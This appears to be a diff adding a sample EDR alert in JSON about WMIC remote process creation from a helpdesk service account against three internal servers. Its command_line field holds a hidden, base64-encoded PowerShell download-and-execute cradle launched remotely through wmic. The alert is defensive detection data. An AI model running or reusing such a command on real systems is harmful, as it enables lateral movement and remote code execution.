@@ -1,0 +1,28 @@
+{
+  "alert_id": "ALRT-2026-0422-009",
+  "timestamp": "2026-04-22T02:41:19Z",
+  "source": "edr",
+  "severity": "high",
+  "title": "WMIC remote process creation against multiple internal servers",
+  "raw_log": {
+    "event_type": "process_creation",
+    "host": "helpdesk-ws-07.corp.internal",
+    "user": "CORP\\svc-helpdesk",
+    "parent_process": "cmd.exe",
+    "process": "wmic.exe",
+    "command_line": "wmic.exe /node:10.20.30.41 process call create \"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA\"",
+    "remote_process_created": true,
+    "distinct_targets_10m": ["10.20.30.41", "10.20.30.42", "10.20.30.55"],
+    "auth_result": "success",
+    "logon_type": 3,
+    "account_is_local_admin_on_targets": true,
+    "off_hours": true,
+    "prior_wmic_use_by_account_90d": 0,
+    "first_seen": "2026-04-22T02:38:04Z"
+  },
+  "indicators": {
+    "ips": ["10.20.30.41", "10.20.30.42", "10.20.30.55"],
+    "hashes": [],
+    "users": ["svc-helpdesk"]
+  }
+}
